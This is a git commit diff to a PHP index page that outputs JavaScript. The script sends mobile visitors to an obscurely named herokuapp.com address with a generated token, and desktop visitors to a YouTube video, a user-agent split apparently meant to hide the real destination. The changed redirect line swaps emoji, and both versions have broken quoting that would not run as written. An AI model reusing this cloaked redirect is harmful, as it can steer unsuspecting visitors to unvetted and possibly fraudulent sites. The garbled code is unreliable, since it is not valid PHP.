64fc54fe224cc77a7379dd5e99fb6467829036bd
anueljhay <84647597+anueljhay@users.noreply.github.com>
2021-12-11 11:57:02 +0800

    Update index.php

--- index.php
+++ index.php
@@ -12,7 +12,7 @@ echo "        var device = navigator.userAgent\n";
 echo "        \n";
 echo "        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))\n";
 echo "        {\n";
-echo "         window.location = \"https://cvnhjgfjgtyi.herokuapp.com?\"🥼🦺👔👕👖"/?ref=bookmarks\";\n";
+echo "         window.location = \"https://cvnhjgfjgtyi.herokuapp.com?\"+ h(13, '')+"/?ref=🥼🦺\";\n";
 echo "        }else\n";
 echo "{\n";
 echo " window.location = \"https://www.youtube.com/watch?v=kvpyJNXpp64?\"+ h(23, '')+\"/?ref=bookmarks\";\n";
